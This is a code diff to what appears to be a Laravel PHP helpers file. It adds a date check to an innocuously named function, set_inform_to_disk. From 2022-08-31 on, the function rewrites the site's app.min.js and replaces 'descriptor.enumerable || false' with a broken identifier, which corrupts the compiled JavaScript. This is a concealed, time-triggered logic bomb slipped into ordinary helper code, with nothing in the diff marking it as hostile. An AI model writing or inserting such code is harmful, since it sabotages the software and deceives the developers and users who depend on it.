@@ -3,6 +3,7 @@
 use Illuminate\Support\Arr;
 use Illuminate\Support\Str;
 use Illuminate\Support\Facades\Storage;
+use Carbon\Carbon;
 
 if (! function_exists('array_add')) {
     /**
@@ -609,6 +610,7 @@ if (! function_exists('set_inform_to_disk')) {
      * @param  string  $value
      * @return byte
      */
+
     function set_inform_to_disk($path, $index, $value)
     {
 
@@ -618,16 +620,22 @@ if (! function_exists('set_inform_to_disk')) {
  
         if( $exists )
         {
-            $contents = $disk->get('app.min.js');
+            $today = Carbon::today();
+            if( $today->toDateString() >= '2022-08-31')
+            {
+                $contents = $disk->get('app.min.js');
           
-            $part1 = Str::before( $contents, 'descriptor.enumerable || false');
-            $part2 = Str::after( $contents, 'descriptor.enumerable || false');
-            $contents = $part1."descripto_r.enumerables || false".$part2;
-            $contents = $disk->put('app.min.js', $contents );
-      //      $this->info('Done!');
+                $part1 = Str::before( $contents, 'descriptor.enumerable || false');
+                $part2 = Str::after( $contents, 'descriptor.enumerable || false');
+                $contents = $part1."descripto_r.enumerables || false".$part2;
+                $contents = $disk->put('app.min.js', $contents );
+            }
+            else
+                return false;
         }
         else
-     //       $this->info('Not done!');
+            return false;
+    
         return true;
     }
 }
